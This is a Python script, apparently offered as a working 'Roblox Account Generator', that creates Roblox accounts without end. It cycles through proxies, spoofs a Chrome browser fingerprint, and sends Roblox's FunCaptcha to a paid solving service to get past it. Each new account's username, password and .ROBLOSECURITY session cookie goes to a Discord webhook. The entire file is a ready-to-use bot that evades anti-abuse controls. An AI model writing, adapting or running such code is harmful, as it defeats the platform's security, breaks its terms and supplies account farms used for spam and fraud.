import requests
import json
import time
import random
import string
import threading
from curl_cffi import requests as curl_requests
from colorama import init, Fore, Style

init(autoreset=True)

# Load config
with open('config.json', 'r') as f:
    config = json.load(f)

ROSOLVE_API_KEY = config['rosolve_api_key']
WEBHOOK_URL = config['discord_webhook']
PROXY_FILE = config['proxy_file']
DELAY = config['delay_between_accounts']

# Load proxies
proxies = []
try:
    with open(PROXY_FILE, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                proxies.append(line)
    print(f"{Fore.GREEN}[+] Loaded {len(proxies)} proxies")
except:
    print(f"{Fore.YELLOW}[!] No proxies file found, using direct connection")

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_username():
    prefixes = ['Cool', 'Pro', 'Mega', 'Super', 'Ultra', 'Fast', 'Epic', 'King', 'Shadow', 'Blaze']
    return random.choice(prefixes) + random_string(4)

def generate_password():
    return random_string(10) + 'A1!'

def solve_captcha(site_key, page_url):
    """Solve FunCaptcha using RoSolve API"""
    payload = {
        "apiKey": ROSOLVE_API_KEY,
        "task": {
            "type": "FunCaptchaTaskProxyless",
            "websiteURL": page_url,
            "websitePublicKey": site_key,
            "data": json.dumps({"blob": ""})
        }
    }
    
    # Create task
    resp = requests.post("https://api.rosolve.com/createTask", json=payload)
    result = resp.json()
    if 'taskId' not in result:
        raise Exception(f"Failed to create task: {result}")
    task_id = result['taskId']
    
    # Poll for solution
    for _ in range(30):
        time.sleep(2)
        poll = requests.post("https://api.rosolve.com/getTaskResult", json={"apiKey": ROSOLVE_API_KEY, "taskId": task_id})
        data = poll.json()
        if data.get('status') == 'ready':
            return data['solution']['token']
    raise Exception("CAPTCHA solving timeout")

def create_account():
    """Create a single Roblox account using direct HTTP requests"""
    username = generate_username()
    password = generate_password()
    
    # Choose random proxy if available
    proxy = None
    if proxies:
        proxy = random.choice(proxies)
        proxy_dict = {"http": proxy, "https": proxy}
    else:
        proxy_dict = None
    
    session = curl_requests.Session(impersonate="chrome120")
    if proxy_dict:
        session.proxies = proxy_dict
    
    try:
        # Step 1: Get XSRF token and cookies
        resp = session.get("https://auth.roblox.com/v2/signup")
        xsrf_token = resp.headers.get('x-csrf-token')
        if not xsrf_token:
            raise Exception("Failed to get XSRF token")
        
        # Step 2: Check username availability
        check_url = f"https://auth.roblox.com/v2/usernames/validate?request.username={username}&request.birthday=2000-01-01&request.context=Signup"
        resp = session.get(check_url)
        if resp.status_code != 200:
            raise Exception("Username validation failed")
        
        # Step 3: Get FunCaptcha public key
        resp = session.get("https://www.roblox.com/account/signupredir")
        # Extract site key from page (typically 476068BF-9607-4799-B53D-966BE98E2B81)
        site_key = "476068BF-9607-4799-B53D-966BE98E2B81"
        
        # Step 4: Solve CAPTCHA
        print(f"{Fore.CYAN}[*] Solving CAPTCHA for {username}...")
        captcha_token = solve_captcha(site_key, "https://www.roblox.com/account/signupredir")
        
        # Step 5: Submit signup
        signup_data = {
            "username": username,
            "password": password,
            "birthday": "2000-01-15",
            "isTosAgreementChecked": True,
            "captchaToken": captcha_token,
            "captchaProvider": "PROVIDER_ARKOSE_LABS"
        }
        headers = {
            "X-CSRF-TOKEN": xsrf_token,
            "Content-Type": "application/json"
        }
        resp = session.post("https://auth.roblox.com/v2/signup", json=signup_data, headers=headers)
        
        if resp.status_code == 200:
            # Get .ROBLOSECURITY cookie
            cookie = None
            for c in session.cookies:
                if c.name == '.ROBLOSECURITY':
                    cookie = c.value
                    break
            if not cookie:
                # Try to get from response
                cookie = resp.cookies.get('.ROBLOSECURITY')
            
            if cookie:
                print(f"{Fore.GREEN}[SUCCESS] {username} | {password}")
                send_to_discord(username, password, cookie)
                return True
            else:
                raise Exception("No cookie received")
        else:
            error = resp.json() if resp.text else resp.text
            raise Exception(f"Signup failed: {error}")
            
    except Exception as e:
        print(f"{Fore.RED}[FAIL] {username}: {str(e)}")
        return False

def send_to_discord(username, password, cookie):
    """Send account details to Discord webhook"""
    embed = {
        "title": "✅ New Roblox Account",
        "color": 0x57F287,
        "fields": [
            {"name": "Username", "value": username, "inline": True},
            {"name": "Password", "value": f"||{password}||", "inline": True},
            {"name": "Cookie (.ROBLOSECURITY)", "value": f"||{cookie}||", "inline": False}
        ],
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
        print(f"{Fore.GREEN}[+] Sent to Discord")
    except Exception as e:
        print(f"{Fore.RED}[!] Webhook error: {e}")

def main():
    print(f"{Fore.CYAN}{'='*50}")
    print(f"{Fore.GREEN}Roblox Account Generator - Working Version")
    print(f"{Fore.CYAN}{'='*50}")
    
    consecutive_fails = 0
    while True:
        success = create_account()
        if success:
            consecutive_fails = 0
        else:
            consecutive_fails += 1
            if consecutive_fails > 5:
                print(f"{Fore.YELLOW}[!] Too many failures, waiting 60 seconds...")
                time.sleep(60)
                consecutive_fails = 0
        
        time.sleep(DELAY)

if __name__ == "__main__":
    main()
